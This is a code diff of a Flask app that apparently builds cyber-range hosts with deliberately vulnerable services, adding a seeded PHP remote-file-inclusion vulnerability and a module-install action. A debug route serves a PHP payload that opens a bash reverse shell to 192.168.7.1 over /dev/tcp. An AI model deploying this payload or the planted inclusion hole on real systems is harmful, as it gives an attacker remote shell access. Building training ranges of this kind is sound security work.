@@ -5,7 +5,7 @@ from flask import Flask, request
 from flask import json
 from mongoengine import *
 
-from host import Host, OperatingSystem, Account, Service, ConfigurationOption
+from host import Host, OperatingSystem, Account, Service, ConfigurationOption, Vulnerability
 from world import World
 
 app = Flask(__name__)
@@ -129,30 +129,27 @@ def get_host(host_id):
                 host.save()
 
             return host.to_json()
-        elif action == 'SERVICE':
-            service_id = data.get('service')
+        elif action == 'MODULE':
+            module_id = data.get('module')
             options = data.get('options')
             files = request.files
 
-            if service_id is None or options is None:
+            if module_id is None or options is None:
                 return "missing param", 400
 
-            service = Service.objects(id=service_id).first()
+            service = Service.objects(id=module_id).first()
+            vuln = Vulnerability.objects(id=module_id).first()
 
-            if service is None:
+            if service is None and vuln is None:
                 return 'invalid service id', 400
 
-            try:
-                check = host.services.get(name=service.name)
-                check.options = options
+            ref = service if service else vuln
+
+            if host.install_module(ref, files=files, options=options):
                 host.save()
                 return host.to_json()
-            except DoesNotExist:
-                if service.install(host, files=files, **options):
-                    host.save()
-                    return host.to_json()
-                else:
-                    return 'installation failed', 400
+            else:
+                return 'installation failed', 400
         else:
             return 'invalid action', 400
 
@@ -167,9 +164,15 @@ def get_services():
     return Service.objects().to_json()
 
 
-@app.route('/api/debug/rfi')
+@app.route('/api/vulns')
+def get_vulns():
+    return Vulnerability.objects().to_json()
+
+
+@app.route('/api/debug/rfi.php')
 def rfi():
-    return '<?php echo hello; shell_exec("bash -i >& /dev/tcp/192.168.7.1/444 0>&1");?>'
+    return '<?php echo hello; echo shell_exec(\'bash -c "bash -i >& /dev/tcp/192.168.7.1/4444 0>&1"\');?>'
+
 print "cyberfront starting"
 
 # ubuntu = OperatingSystem(kernel='LINUX', name='Ubuntu', version='14.04', box='ubuntu/trusty64')
@@ -188,9 +191,23 @@ if len(Service.objects()) == 0:
     apache2 = Service(name='apache_ubuntu', service_name='Apache Web Server', version='2', options=options)
     apache2.save()
 
-sudo_options = {
-    'users': ConfigurationOption(name='Sudoers', description='List of sudoers', type='USER', list=True, default=[])
-}
+if len(World.objects()) == 0:
+    World(name="world1").save()
+
+if len(Vulnerability.objects()) == 0:
+    options = {
+        'file': ConfigurationOption(name='Vulnerable File', description='File that is affected by the vulnerability',
+                                    type='FILE'),
+        'service': ConfigurationOption(name='Affected Service', type='SERVICE')
+    }
+
+    rfi = Vulnerability(name='rfi_apache', full_name='PHP Remote File Inclusion Vulnerability',
+                        category='File Inclusion', requirements=['apache_ubuntu'], options=options)
+    rfi.save()
+
+# sudo_options = {
+#    'users': ConfigurationOption(name='Sudoers', description='List of sudoers', type='USER', list=True, default=[])
+# }
 # sudo = Service(name='ubuntu_sudo', service_name='sudo', version='?', options=sudo_options)
 # sudo.save()
 
@@ -207,5 +224,6 @@ sudo_options = {
 # testmachine = Host(hostname='test', os=ubuntu, accounts=[bob])
 # testmachine.save()
 
-app.run(port=80)
+app.run(port=80, host='192.168.7.1')
+ # app.run(port=80)
 
